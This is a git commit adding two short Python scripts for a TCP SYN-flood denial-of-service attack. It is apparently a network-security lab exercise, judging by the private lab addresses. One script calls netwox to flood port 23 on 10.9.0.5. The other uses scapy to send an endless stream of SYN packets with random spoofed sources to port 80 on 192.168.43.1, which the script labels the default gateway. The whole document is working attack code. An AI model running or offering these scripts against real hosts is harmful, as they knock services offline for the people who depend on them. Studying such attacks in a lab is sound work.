86efa0e9439a5c6ae0737912d51685e5c7582683
Sandeep Varma <67902146+sandeepvarma95@users.noreply.github.com>
2022-04-11 23:34:51 -0400

    SYN-FLOODING

---
+++ SYN_FLOODING/Volumes/syn_flood.py
@@ -0,0 +1,5 @@
+#!/usr/bin/env python3
+import os
+
+bashCommand = "netwox 76 -i 10.9.0.5 -p 23 -s raw"
+os.system(bashCommand)
---
+++ SYN_FLOODING/Volumes/syn_flooding.py
@@ -0,0 +1,13 @@
+#!/usr/bin/env python3
+from scapy.all import *
+#default gateway IP
+target_ip ="192.168.43.1"
+#http port
+target_port = 80
+def synFloodAttack(target_ip, sport, dport):
+    s_addr = RandIP()   #random Ip address
+    pkt =IP(src= s_addr, dst= target_ip)/ TCP(sport =sport, dport=dport, seq= 1505066, flags="S")
+    send(pkt)
+while True:
+    #type CTRL +C to stop the SYN pkt
+    synFloodAttack(target_ip, 1234 , target_port )
